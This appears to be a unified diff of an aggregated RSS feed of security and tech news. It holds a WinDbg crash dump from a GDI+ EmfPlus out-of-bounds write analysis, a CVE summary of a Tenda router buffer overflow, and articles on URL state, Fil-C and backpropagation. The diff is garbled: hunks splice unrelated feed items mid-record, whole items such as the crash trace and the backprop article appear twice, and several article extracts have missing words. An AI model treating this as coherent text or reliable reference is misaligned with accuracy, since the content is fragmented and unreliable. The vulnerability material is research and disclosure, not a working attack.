@@ -196,7 +196,7 @@ Further investigation revealed that the `EmfPlusClear` record handler uses the
 Note that the loop counter stored in the `ebx` register begins at 0x950. As each iteration writes a 4-byte object into the target buffer at `ecx + edx`, the function writes out-of-bounds after 1000 bytes, when the counter reaches 0x567. This behavior can be observed in _Listing 2_ which shows an excerpt from the crash analysis.
 
 ```
-0:000> g (16b8.5ec): Access violation - code c0000005 (first/second chance not available) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=ffccbbaa ebx=00000567 ecx=022cec8c edx=08732374 esi=000015e3 edi=db000000 eip=74e16d9d esp=0075ddb0 ebp=0075ddc0 iopl=0 nv up ei ng nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000282 gdiplus!ScanOperation::AlphaMultiply_sRGB+0x2d: 74e16d9d 890411 mov dword ptr [ecx+edx],eax ds:002b:0aa01000=???????? 0:000> kb # ChildEBP RetAddr Args to Child 00 0075ddc0 74e16653 00000950 0872bd0c 0075e99c gdiplus!ScanOperation::AlphaMultiply_sRGB+0x2d 01 0075ddf4 74e16520 00000000 00000000 00000015 gdiplus!EpScanBitmap::NextBuffer+0xc3 02 0075de2c 74e15c91 00000000 00000000 00000015 gdiplus!DpOutputSolidColorSpan::OutputSpan+0x40 03 0075de58 74e188d4 00000000 ffffff19 00000955 gdiplus!DpClipRegion::OutputSpan+0x141 04 0075de7c 74e15988 00000000 0f47eed0 74e01b40 gdiplus!EpAliasedFiller::FillEdgesWinding+0x54 05 0075e938 74e0420e 00000001 00000003 00000000 gdiplus!RasterizePath+0x5d8 06 0075ea74 74e01cee 08747da0 0873cf98 0075eab8 gdiplus!DpDriver::StrokePath+0x3ee 07 0075ea9c 74e01db7 0075eab8 0075eb20 0075ede0 gdiplus!GpGraphics::DrvStrokePath+0x38 08 0075eadc 74df3b06 0075eb10 0075eb20 0075edcc gdiplus!GpGraphics::RenderDrawPath+0xbc 09 0075ed68 74e50a58 0075edcc 0075ed98 00000002 gdiplus!GpGraphics::DrawLines+0x148 0a 0075ee54 74f034c2 0aa08ff0 0f2a2fb8 00000000 gdiplus!FullTextImager::GdipLscbkDrawUnderline+0x228 0b 0075eee4 74ef7d57 0075f048 00000004 00000000 gdiplus!DrawUnderlineMerge+0x16f 0c 0075ef90 74eef9fd 00000001 00000000 00001015 gdiplus!DisplaySublineCore+0x25b 0d 0075f018 74ed907c 0aa40fa0 0aa40fa0 0aa40fa0 gdiplus!LsDisplayLine+0x193 0e 0075f02c 74edc08e 0075f048 00000000 0aa04e70 gdiplus!BuiltLine::Draw+0x12 0f 0075f058 74edbfd4 0aa40fa0 00000000 0aa04e70 gdiplus!FullTextImager::RenderLine+0x50 10 0075f0d8 74ed915f 0aa04e70 74ed9090 00000000 gdiplus!FullTextImager::Render+0x211 11 0075f108 74e6192a 0873ed28 0075f150 08744cb0 gdiplus!FullTextImager::Draw+0xcf 12 0075f3c8 74e8c55f 05b70184 00000014 0874bfe0 gdiplus!GpGraphics::DrawString+0x2f412 13 0075f404 74e02081 08744cb0 0000401c 0000df00 gdiplus!DrawStringEPR::Play+0xdf // Affects EmfPlusDrawString record 14 0075f428 74e01f97 0000401c 0000df00 00000044 gdiplus!GdipPlayMetafileRecordCallback+0x71 15 0075f45c 74e01e7c 00000104 05b700a8 0865ad58 gdiplus!MetafilePlayer::EnumerateEmfPlusRecords+0x97 16 0075f47c 75ca5d2f a901095a 0866cff8 05b70098 gdiplus!EnumEmfWithDownLevel+0x8c 17 0075f510 75ca4309 74e01df0 08744cb0 0075f58c gdi32full!bInternalPlayEMF+0x830 18 0075f524 771cad7f a901095a 824606f7 74e01df0 gdi32full!EnumEnhMetaFile+0x39 19 0075f544 74df5ed6 a901095a 824606f7 74e01df0 GDI32!EnumEnhMetaFileStub+0x2f 1a 0075f5a0 74df5b3b a901095a 824606f7 0075f5e4 gdiplus!MetafilePlayer::EnumerateEmfRecords+0xdf 1b 0075f648 74df81bc 08744cb0 824606f7 0075f774 gdiplus!GpGraphics::EnumEmfPlusDual+0x351 // Affects EMF+ Dual 1c 0075f7b8 74e1384c 0075f810 0075f810 00000002 gdiplus!GpMetafile::EnumerateForPlayback+0x819 1d 0075f8d8 74e01903 08723f28 0075f908 0075f918 gdiplus!GpGraphics::DrawImage+0x5ec 1e 0075f944 74e8a69e 08723f28 0075f96c 0075f97c gdiplus!GpGraphics::DrawImage+0x61 1f 0075f9a4 74e8b8a6 00000064 00000064 08723f28 gdiplus!GpMetafile::GetBitmap+0x1d2 20 0075f9b8 74e6e16b 00000064 00000064 00000000 gdiplus!GpMetafile::GetThumbnail+0x26 21 0075f9e0 006511a0 08723f28 00000064 00000064 gdiplus!GdipGetImageThumbnail+0x6b // Reachable via thumbnails <<<<<<<<<<<<<]]></content:encoded></item><item><title>Two years after an audit highlighted significant concerns, North Salem Central School District leaves sensitive student data at risk</title><link>https://databreaches.net/2025/11/02/two-years-after-an-audit-highlighted-significant-concerns-north-salem-central-school-district-leaves-sensitive-student-data-at-risk/?pk_campaign=feed&amp;pk_kwd=two-years-after-an-audit-highlighted-significant-concerns-north-salem-central-school-district-leaves-sensitive-student-data-at-risk</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 2 Nov 2025 13:07:00 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>University of Pennsylvania says it wasn’t hacked after a vulgar email was sent to campus community</title><link>https://databreaches.net/2025/11/02/university-of-pennsylvania-says-it-wasnt-hacked-after-a-vulgar-email-was-sent-to-campus-community/?pk_campaign=feed&amp;pk_kwd=university-of-pennsylvania-says-it-wasnt-hacked-after-a-vulgar-email-was-sent-to-campus-community</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 2 Nov 2025 13:04:25 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-12596 - Tenda AC23 saveParentControlInfo buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12596</link><author></author><category>vulns</category><pubDate>Sun, 2 Nov 2025 11:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12596
+0:000> g (16b8.5ec): Access violation - code c0000005 (first/second chance not available) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=ffccbbaa ebx=00000567 ecx=022cec8c edx=08732374 esi=000015e3 edi=db000000 eip=74e16d9d esp=0075ddb0 ebp=0075ddc0 iopl=0 nv up ei ng nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000282 gdiplus!ScanOperation::AlphaMultiply_sRGB+0x2d: 74e16d9d 890411 mov dword ptr [ecx+edx],eax ds:002b:0aa01000=???????? 0:000> kb # ChildEBP RetAddr Args to Child 00 0075ddc0 74e16653 00000950 0872bd0c 0075e99c gdiplus!ScanOperation::AlphaMultiply_sRGB+0x2d 01 0075ddf4 74e16520 00000000 00000000 00000015 gdiplus!EpScanBitmap::NextBuffer+0xc3 02 0075de2c 74e15c91 00000000 00000000 00000015 gdiplus!DpOutputSolidColorSpan::OutputSpan+0x40 03 0075de58 74e188d4 00000000 ffffff19 00000955 gdiplus!DpClipRegion::OutputSpan+0x141 04 0075de7c 74e15988 00000000 0f47eed0 74e01b40 gdiplus!EpAliasedFiller::FillEdgesWinding+0x54 05 0075e938 74e0420e 00000001 00000003 00000000 gdiplus!RasterizePath+0x5d8 06 0075ea74 74e01cee 08747da0 0873cf98 0075eab8 gdiplus!DpDriver::StrokePath+0x3ee 07 0075ea9c 74e01db7 0075eab8 0075eb20 0075ede0 gdiplus!GpGraphics::DrvStrokePath+0x38 08 0075eadc 74df3b06 0075eb10 0075eb20 0075edcc gdiplus!GpGraphics::RenderDrawPath+0xbc 09 0075ed68 74e50a58 0075edcc 0075ed98 00000002 gdiplus!GpGraphics::DrawLines+0x148 0a 0075ee54 74f034c2 0aa08ff0 0f2a2fb8 00000000 gdiplus!FullTextImager::GdipLscbkDrawUnderline+0x228 0b 0075eee4 74ef7d57 0075f048 00000004 00000000 gdiplus!DrawUnderlineMerge+0x16f 0c 0075ef90 74eef9fd 00000001 00000000 00001015 gdiplus!DisplaySublineCore+0x25b 0d 0075f018 74ed907c 0aa40fa0 0aa40fa0 0aa40fa0 gdiplus!LsDisplayLine+0x193 0e 0075f02c 74edc08e 0075f048 00000000 0aa04e70 gdiplus!BuiltLine::Draw+0x12 0f 0075f058 74edbfd4 0aa40fa0 00000000 0aa04e70 gdiplus!FullTextImager::RenderLine+0x50 10 0075f0d8 74ed915f 0aa04e70 74ed9090 00000000 gdiplus!FullTextImager::Render+0x211 11 0075f108 74e6192a 0873ed28 0075f150 08744cb0 gdiplus!FullTextImager::Draw+0xcf 12 0075f3c8 74e8c55f 05b70184 00000014 0874bfe0 gdiplus!GpGraphics::DrawString+0x2f412 13 0075f404 74e02081 08744cb0 0000401c 0000df00 gdiplus!DrawStringEPR::Play+0xdf // Affects EmfPlusDrawString record 14 0075f428 74e01f97 0000401c 0000df00 00000044 gdiplus!GdipPlayMetafileRecordCallback+0x71 15 0075f45c 74e01e7c 00000104 05b700a8 0865ad58 gdiplus!MetafilePlayer::EnumerateEmfPlusRecords+0x97 16 0075f47c 75ca5d2f a901095a 0866cff8 05b70098 gdiplus!EnumEmfWithDownLevel+0x8c 17 0075f510 75ca4309 74e01df0 08744cb0 0075f58c gdi32full!bInternalPlayEMF+0x830 18 0075f524 771cad7f a901095a 824606f7 74e01df0 gdi32full!EnumEnhMetaFile+0x39 19 0075f544 74df5ed6 a901095a 824606f7 74e01df0 GDI32!EnumEnhMetaFileStub+0x2f 1a 0075f5a0 74df5b3b a901095a 824606f7 0075f5e4 gdiplus!MetafilePlayer::EnumerateEmfRecords+0xdf 1b 0075f648 74df81bc 08744cb0 824606f7 0075f774 gdiplus!GpGraphics::EnumEmfPlusDual+0x351 // Affects EMF+ Dual 1c 0075f7b8 74e1384c 0075f810 0075f810 00000002 gdiplus!GpMetafile::EnumerateForPlayback+0x819 1d 0075f8d8 74e01903 08723f28 0075f908 0075f918 gdiplus!GpGraphics::DrawImage+0x5ec 1e 0075f944 74e8a69e 08723f28 0075f96c 0075f97c gdiplus!GpGraphics::DrawImage+0x61 1f 0075f9a4 74e8b8a6 00000064 00000064 08723f28 gdiplus!GpMetafile::GetBitmap+0x1d2 20 0075f9b8 74e6e16b 00000064 00000064 00000000 gdiplus!GpMetafile::GetThumbnail+0x26 21 0075f9e0 006511a0 08723f28 00000064 00000064 gdiplus!GdipGetImageThumbnail+0x6b // Reachable via thumbnails <<<<<<<<<<<<<]]></content:encoded></item><item><title>Two years after an audit highlighted significant concerns, North Salem Central School District leaves sensitive student data at risk</title><link>https://databreaches.net/2025/11/02/two-years-after-an-audit-highlighted-significant-concerns-north-salem-central-school-district-leaves-sensitive-student-data-at-risk/?pk_campaign=feed&amp;pk_kwd=two-years-after-an-audit-highlighted-significant-concerns-north-salem-central-school-district-leaves-sensitive-student-data-at-risk</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 2 Nov 2025 13:07:00 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>University of Pennsylvania says it wasn’t hacked after a vulgar email was sent to campus community</title><link>https://databreaches.net/2025/11/02/university-of-pennsylvania-says-it-wasnt-hacked-after-a-vulgar-email-was-sent-to-campus-community/?pk_campaign=feed&amp;pk_kwd=university-of-pennsylvania-says-it-wasnt-hacked-after-a-vulgar-email-was-sent-to-campus-community</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 2 Nov 2025 13:04:25 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Tongyi DeepResearch – open-source 30B MoE Model that rivals OpenAI DeepResearch</title><link>https://tongyi-agent.github.io/blog/introducing-tongyi-deep-research/</link><author>meander_water</author><category>dev</category><pubDate>Sun, 2 Nov 2025 11:43:26 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-12596 - Tenda AC23 saveParentControlInfo buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12596</link><author></author><category>vulns</category><pubDate>Sun, 2 Nov 2025 11:15:35 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12596
  Nov. 2, 2025, 11:15 a.m. | 1 hour, 16 minutes ago
 A security vulnerability has been detected in Tenda AC23 16.03.07.52. Affected is the function saveParentControlInfo of the file /goform/saveParentControlInfo. Such manipulation of the argument Time leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed publicly and may be used.
  9.0 | HIGH
@@ -205,7 +205,7 @@ Visit the link for more details, such as CVSS details, affected products, timeli
 ]]></content:encoded></item><item><title>URLs are state containers</title><link>https://alfy.blog/2025/10/31/your-url-is-your-state.html</link><author>thm</author><category>dev</category><pubDate>Sun, 2 Nov 2025 11:12:58 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Couple of weeks ago when I was publishing The Hidden Cost of URL Design I needed to add SQL syntax highlighting. I headed to PrismJS website trying to remember if it should be added as a plugin or what. I was overwhelmed with the amount of options in the download page so I headed back to my code. I checked the file for PrismJS and at the top of the file, I found a comment containing a URL:/* https://prismjs.com/download.html#themes=prism&languages=markup+css+clike+javascript+bash+css-extras+markdown+scss+sql&plugins=line-highlight+line-numbers+autolinker */
 I had completely forgotten about this. I clicked the URL, and it was the PrismJS download page with every checkbox, dropdown, and option pre-selected to match my exact configuration. Themes chosen. Languages selected. Plugins enabled. Everything, perfectly reconstructed from that single URL.It was one of those moments where something you once knew suddenly clicks again with fresh significance. Here was a URL doing far more than just pointing to a page. It was storing state, encoding intent, and making my entire setup shareable and recoverable. No database. No cookies. No localStorage. Just a URL.This got me thinking: how often do we, as frontend engineers, overlook the URL as a state management tool? We reach for all sorts of abstractions to manage state such as global stores, contexts, and caches while ignoring one of the web’s most elegant and oldest features: the humble URL.In my previous article, I wrote about the hidden costs of bad URL design. Today, I want to flip that perspective and talk about the immense value of  URL design. Specifically, how URLs can be treated as first-class state containers in modern web applications.The Overlooked Power of URLsScott Hanselman famously said “URLs are UI” and he’s absolutely right. URLs aren’t just technical addresses that browsers use to fetch resources. They’re interfaces. They’re part of the user experience.But URLs are more than UI. They’re . Every time you craft a URL, you’re making decisions about what information to preserve, what to make shareable, and what to make bookmarkable.Think about what URLs give us for free:: Send someone a link, and they see exactly what you see: Save a URL, and you’ve saved a moment in time: The back button just works: Jump directly into a specific application stateURLs make web applications resilient and predictable. They’re the web’s original state management solution, and they’ve been working reliably since 1991. The question isn’t whether URLs  store state. It’s whether we’re using them to their full potential.Before we dive into examples, let’s break down how URLs encode state. Here’s a typical stateful URL:Different parts of the URL encode different types of state:Path Segments (). Best used for hierarchical resource navigation:
      - User 123’s posts - Documentation structure - Application sectionsQuery Parameters (). Perfect for , , and :
-     - UI preferences - Pagination - Data filtering?from=2025-01-01&to=2025-12-31 - Date rangesAnchor (). Ideal for client-side navigation and page sections:
+     - UI preferences - Pagination - Data filtering?from=2025-01-01&to=2025-12-31 - Date ranges Fragment (). Ideal for client-side navigation and page sections:
      - GitHub line highlighting - Scroll to section - Single-page app routing (though it’s rarely used these days)Multiple values with delimitersSometimes you’ll see multiple values packed into a single key using delimiters like commas or plus signs. It’s compact and human-readable, though it requires manual parsing on the server side.?languages=javascript+typescript+python
 ?tags=frontend,react,hooks
 Nested or structured dataDevelopers often encode complex filters or configuration objects into a single query string. A simple convention uses key–value pairs separated by commas, while others serialize JSON or even Base64-encode it for safety.?filters=status:active,owner:me,priority:high
@@ -335,7 +335,7 @@ Visit the link for more details, such as CVSS details, affected products, timeli
 ]]></content:encoded></item><item><title>Week in review: WSUS vulnerability exploited to drop Skuld infostealer, PoC for BIND 9 DNS flaw published</title><link>https://www.helpnetsecurity.com/2025/11/02/week-in-review-wsus-vulnerability-exploited-to-drop-skuld-infostealer-poc-for-bind-9-dns-flaw-published/</link><author></author><category>security</category><pubDate>Sun, 2 Nov 2025 09:00:27 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
             Here’s an overview of some of last week’s most interesting news, articles, interviews and videos:
 Can your earbuds recognize you? Researchers are working on it
-Biometric authentication has moved from  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Notes by djb on using Fil-C (2025)</title><link>https://cr.yp.to/2025/fil-c.html</link><author>transpute</author><category>dev</category><pubDate>Sun, 2 Nov 2025 05:32:02 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[
+Biometric authentication has moved from  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Notes by djb on using Fil-C</title><link>https://cr.yp.to/2025/fil-c.html</link><author>transpute</author><category>dev</category><pubDate>Sun, 2 Nov 2025 05:32:02 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[
 I'm impressed with the level of compatibility
 of the new memory-safe C/C++ compiler
 Fil-C
@@ -860,7 +860,7 @@ but this is in any case an example of the messiness that I'm planning to get rid
 
 Seems to work.
 Depends on readline.
-]]></content:encoded></item><item><title>Backpropagation is a leaky abstraction (2016)</title><link>https://karpathy.medium.com/yes-you-should-understand-backprop-e2f06eab496b</link><author>swatson741</author><category>dev</category><pubDate>Sun, 2 Nov 2025 05:20:12 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[When we offered CS231n (Deep Learning class) at Stanford, we intentionally designed the programming assignments to include explicit calculations involved in backpropagation on the lowest level. The students had to implement the forward and the backward pass of each layer in raw numpy. Inevitably, some students complained on the class message boards:“Why do we have to write the backward pass when frameworks in the real world, such as TensorFlow, compute them for you automatically?”This is seemingly a perfectly sensible appeal - if you’re never going to write backward passes once the class is over, why practice writing them? Are we just torturing the students for our own amusement? Some easy answers could make arguments along the lines of “it’s worth knowing what’s under the hood as an intellectual curiosity”, or perhaps “you might want to improve on the core algorithm later”, but there is a much stronger and practical argument, which I wanted to devote a whole post to:> The problem with Backpropagation is that it is a In other words, it is easy to fall into the trap of abstracting away the learning process — believing that you can simply stack arbitrary layers together and backprop will “magically make them work” on your data. So lets look at a few explicit examples where this is not the case in quite unintuitive ways.Vanishing gradients on sigmoidsWe’re starting off easy here. At one point it was fashionable to use  (or ) non-linearities in the fully connected layers. The tricky part people might not realize until they think about the backward pass is that if you are sloppy with the weight initialization or data preprocessing these non-linearities can “saturate” and entirely stop learning — your training loss will be flat and refuse to go down. For example, a fully connected layer with sigmoid non-linearity computes (using raw numpy):If your weight matrix  is initialized too large, the output of the matrix multiply could have a very large range (e.g. numbers between -400 and 400), which will make all outputs in the vector  almost binary: either 1 or 0. But if that is the case, , which is local gradient of the sigmoid non-linearity, will in both cases become (“vanish”)making the gradient for both  and be zero. The rest of the backward pass will come out all zero from this point on due to multiplication in the chain rule.Another non-obvious fun fact about sigmoid is that its local gradient (z*(1-z)) achieves a maximum at 0.25, when z = 0.5. That means that every time the gradient signal flows through a sigmoid gate, its magnitude always diminishes by one quarter (or more). If you’re using basic SGD, this would make the lower layers of a network train much slower than the higher ones.: if you’re using  or non-linearities in your network and you understand backpropagation you should always be nervous about making sure that the initialization doesn’t cause them to be fully saturated. See a longer explanation in this CS231n lecture video.Another fun non-linearity is the ReLU, which thresholds neurons at zero from below. The forward and backward pass for a fully connected layer that uses ReLU would at the core include:If you stare at this for a while you’ll see that if a neuron gets clamped to zero in the forward pass (i.e. =0, it doesn’t “fire”), then its weights will get zero gradient. This can lead to what is called the “dead ReLU” problem, where if a ReLU neuron is unfortunately initialized such that it never fires, or if a neuron’s weights ever get knocked off with a large update during training into this regime, then this neuron will remain permanently dead. It’s like permanent, irrecoverable brain damage. Sometimes you can forward the entire training set through a trained network and find that a large fraction (e.g. 40%) of your neurons were zero the entire time.: If you understand backpropagation and your network has ReLUs, you’re always nervous about dead ReLUs. These are neurons that never turn on for any example in your entire training set, and will remain permanently dead. Neurons can also die during training, usually as a symptom of aggressive learning rates. See a longer explanation in CS231n lecture video.Exploding gradients in RNNsVanilla RNNs feature another good example of unintuitive effects of backpropagation. I’ll copy paste a slide from CS231n that has a simplified RNN that does not take any input , and only computes the recurrence on the hidden state (equivalently, the input  could always be zero):This RNN is unrolled for  time steps. When you stare at what the backward pass is doing, you’ll see that the gradient signal going backwards in time through all the hidden states is always being multiplied by the same matrix (the recurrence matrix ), interspersed with non-linearity backprop.What happens when you take one number  and start multiplying it by some other number  (i.e. a*b*b*b*b*b*b…)? This sequence either goes to zero if  < 1, or explodes to infinity when . The same thing happens in the backward pass of an RNN, except is a matrix and not just a number, so we have to reason about its largest eigenvalue instead.: If you understand backpropagation and you’re using RNNs you are nervous about having to do gradient clipping, or you prefer to use an LSTM. See a longer explanation in this CS231n lecture video.Spotted in the Wild: DQN ClippingLets look at one more — the one that actually inspired this post. Yesterday I was browsing for a Deep Q Learning implementation in TensorFlow (to see how others deal with computing the numpy equivalent of , where  is an integer vector — turns out this trivial operation is not supported in TF). Anyway, I searched , clicked the first link, and found the core code. Here is an excerpt:If you’re familiar with DQN, you can see that there is the which is just [reward * \gamma \argmax_a Q(s’,a)], and then there is , which is  of the action that was taken. The authors here subtract the two into variable which they then want to minimize on line 295 with the L2 loss with tf.reduce_mean(tf.square()). So far so good.The problem is on line 291. The authors are trying to be robust to outliers, so if the delta is too large, they clip it with . This is well-intentioned and looks sensible from the perspective of the forward pass, but it introduces a major bug if you think about the backward pass.The  function has a local gradient of zero outside of the range  to , so whenever the delta is above min/max_delta, the gradient becomes exactly zero during backprop. The authors are clipping the raw Q delta, when they are likely trying to clip the gradient for added robustness. In that case the correct thing to do is to use the Huber loss in place of :It’s a bit gross in TensorFlow because all we want to do is clip the gradient if it is above a threshold, but since we can’t meddle with the gradients directly we have to do it in this round-about way of defining the Huber loss. In Torch this would be much more simple.I submitted an issue on the DQN repo and this was promptly fixed.Backpropagation is a leaky abstraction; it is a credit assignment scheme with non-trivial consequences. If you try to ignore how it works under the hood because “TensorFlow automagically makes my networks learn”, you will not be ready to wrestle with the dangers it presents, and you will be much less effective at building and debugging neural networks.The good news is that backpropagation is not that difficult to understand, if presented properly. I have relatively strong feelings on this topic because it seems to me that 95% of backpropagation materials out there present it all wrong, filling pages with mechanical math. Instead, I would recommend the CS231n lecture on backprop which emphasizes intuition (yay for shameless self-advertising). And if you can spare the time, as a bonus, work through the CS231n assignments, which get you to write backprop manually and help you solidify your understanding.That’s it for now! I hope you’ll be much more suspicious of backpropagation going forward and think carefully through what the backward pass is doing. Also, I’m aware that this post has (unintentionally!) turned into several CS231n ads. Apologies for that :)]]></content:encoded></item><item><title>How I use every Claude Code feature</title><link>https://blog.sshh.io/p/how-i-use-every-claude-code-feature</link><author>sshh12</author><category>dev</category><pubDate>Sun, 2 Nov 2025 00:13:27 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I use Claude Code. A lot.--dangerously-skip-permissionsseveral billion tokens per monthThe CLI agent space is getting crowded and between Claude Code, Gemini CLI, Cursor, and Codex CLI, it feels like the real race is between Anthropic and OpenAI. But TBH when I talk to other developers, their choice often comes down to what feels like superficials—a “lucky” feature implementation or a system prompt “vibe” they just prefer. At this point these tools are all pretty good. I also feel like folks often also over index on the output style or UI. Like to me the “you’re absolutely right!” sycophancy isn’t a notable bug; it’s a signal that you’re too in-the-loop. Generally my goal is to “shoot and forget”—to delegate, set the context, and let it work. Judging the tool by the final PR and not how it gets there.This post ended up a bit long and I’d recommend it as more of a reference than something to read in entirety. How you treat this file depends on the context. For my hobby projects, I let Claude dump whatever it wants in there.It only documents tools and APIs used by 30% (arbitrary) or more of our engineers (else tools are documented in product or library specific markdown files)Start with Guardrails, Not a Manual.Here’s a simplified snapshot:# Monorepo
+]]></content:encoded></item><item><title>Backpropagation is a leaky abstraction (2016)</title><link>https://karpathy.medium.com/yes-you-should-understand-backprop-e2f06eab496b</link><author>swatson741</author><category>dev</category><pubDate>Sun, 2 Nov 2025 05:20:12 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[When we offered CS231n (Deep Learning class) at Stanford, we intentionally designed the programming assignments to include explicit calculations involved in backpropagation on the lowest level. The students had to implement the forward and the backward pass of each layer in raw numpy. Inevitably, some students complained on the class message boards:“Why do we have to write the backward pass when frameworks in the real world, such as TensorFlow, compute them for you automatically?”This is seemingly a perfectly sensible appeal - if you’re never going to write backward passes once the class is over, why practice writing them? Are we just torturing the students for our own amusement? Some easy answers could make arguments along the lines of “it’s worth knowing what’s under the hood as an intellectual curiosity”, or perhaps “you might want to improve on the core algorithm later”, but there is a much stronger and practical argument, which I wanted to devote a whole post to:> The problem with Backpropagation is that it is a In other words, it is easy to fall into the trap of abstracting away the learning process — believing that you can simply stack arbitrary layers together and backprop will “magically make them work” on your data. So lets look at a few explicit examples where this is not the case in quite unintuitive ways.Vanishing gradients on sigmoidsWe’re starting off easy here. At one point it was fashionable to use  (or ) non-linearities in the fully connected layers. The tricky part people might not realize until they think about the backward pass is that if you are sloppy with the weight initialization or data preprocessing these non-linearities can “saturate” and entirely stop learning — your training loss will be flat and refuse to go down. For example, a fully connected layer with sigmoid non-linearity computes (using raw numpy):If your weight matrix  is initialized too large, the output of the matrix multiply could have a very large range (e.g. numbers between -400 and 400), which will make all outputs in the vector  almost binary: either 1 or 0. But if that is the case, , which is local gradient of the sigmoid non-linearity, will in both cases become (“vanish”)making the gradient for both  and be zero. The rest of the backward pass will come out all zero from this point on due to multiplication in the chain rule.Another non-obvious fun fact about sigmoid is that its local gradient (z*(1-z)) achieves a maximum at 0.25, when z = 0.5. That means that every time the gradient signal flows through a sigmoid gate, its magnitude always diminishes by one quarter (or more). If you’re using basic SGD, this would make the lower layers of a network train much slower than the higher ones.: if you’re using  or non-linearities in your network and you understand backpropagation you should always be nervous about making sure that the initialization doesn’t cause them to be fully saturated. See a longer explanation in this CS231n lecture video.Another fun non-linearity is the ReLU, which thresholds neurons at zero from below. The forward and backward pass for a fully connected layer that uses ReLU would at the core include:If you stare at this for a while you’ll see that if a neuron gets clamped to zero in the forward pass (i.e. =0, it doesn’t “fire”), then its weights will get zero gradient. This can lead to what is called the “dead ReLU” problem, where if a ReLU neuron is unfortunately initialized such that it never fires, or if a neuron’s weights ever get knocked off with a large update during training into this regime, then this neuron will remain permanently dead. It’s like permanent, irrecoverable brain damage. Sometimes you can forward the entire training set through a trained network and find that a large fraction (e.g. 40%) of your neurons were zero the entire time.: If you understand backpropagation and your network has ReLUs, you’re always nervous about dead ReLUs. These are neurons that never turn on for any example in your entire training set, and will remain permanently dead. Neurons can also die during training, usually as a symptom of aggressive learning rates. See a longer explanation in CS231n lecture video.Exploding gradients in RNNsVanilla RNNs feature another good example of unintuitive effects of backpropagation. I’ll copy paste a slide from CS231n that has a simplified RNN that does not take any input , and only computes the recurrence on the hidden state (equivalently, the input  could always be zero):This RNN is unrolled for  time steps. When you stare at what the backward pass is doing, you’ll see that the gradient signal going backwards in time through all the hidden states is always being multiplied by the same matrix (the recurrence matrix ), interspersed with non-linearity backprop.What happens when you take one number  and start multiplying it by some other number  (i.e. a*b*b*b*b*b*b…)? This sequence either goes to zero if  < 1, or explodes to infinity when . The same thing happens in the backward pass of an RNN, except is a matrix and not just a number, so we have to reason about its largest eigenvalue instead.: If you understand backpropagation and you’re using RNNs you are nervous about having to do gradient clipping, or you prefer to use an LSTM. See a longer explanation in this CS231n lecture video.Spotted in the Wild: DQN ClippingLets look at one more — the one that actually inspired this post. Yesterday I was browsing for a Deep Q Learning implementation in TensorFlow (to see how others deal with computing the numpy equivalent of , where  is an integer vector — turns out this trivial operation is not supported in TF). Anyway, I searched , clicked the first link, and found the core code. Here is an excerpt:If you’re familiar with DQN, you can see that there is the which is just [reward * \gamma \argmax_a Q(s’,a)], and then there is , which is  of the action that was taken. The authors here subtract the two into variable which they then want to minimize on line 295 with the L2 loss with tf.reduce_mean(tf.square()). So far so good.The problem is on line 291. The authors are trying to be robust to outliers, so if the delta is too large, they clip it with . This is well-intentioned and looks sensible from the perspective of the forward pass, but it introduces a major bug if you think about the backward pass.The  function has a local gradient of zero outside of the range  to , so whenever the delta is above min/max_delta, the gradient becomes exactly zero during backprop. The authors are clipping the raw Q delta, when they are likely trying to clip the gradient for added robustness. In that case the correct thing to do is to use the Huber loss in place of :It’s a bit gross in TensorFlow because all we want to do is clip the gradient if it is above a threshold, but since we can’t meddle with the gradients directly we have to do it in this round-about way of defining the Huber loss. In Torch this would be much more simple.I submitted an issue on the DQN repo and this was promptly fixed.Backpropagation is a leaky abstraction; it is a credit assignment scheme with non-trivial consequences. If you try to ignore how it works under the hood because “TensorFlow automagically makes my networks learn”, you will not be ready to wrestle with the dangers it presents, and you will be much less effective at building and debugging neural networks.The good news is that backpropagation is not that difficult to understand, if presented properly. I have relatively strong feelings on this topic because it seems to me that 95% of backpropagation materials out there present it all wrong, filling pages with mechanical math. Instead, I would recommend the CS231n lecture on backprop which emphasizes intuition (yay for shameless self-advertising). And if you can spare the time, as a bonus, work through the CS231n assignments, which get you to write backprop manually and help you solidify your understanding.That’s it for now! I hope you’ll be much more suspicious of backpropagation going forward and think carefully through what the backward pass is doing. Also, I’m aware that this post has (unintentionally!) turned into several CS231n ads. Apologies for that :)]]></content:encoded></item><item><title>You Don&apos;t Need 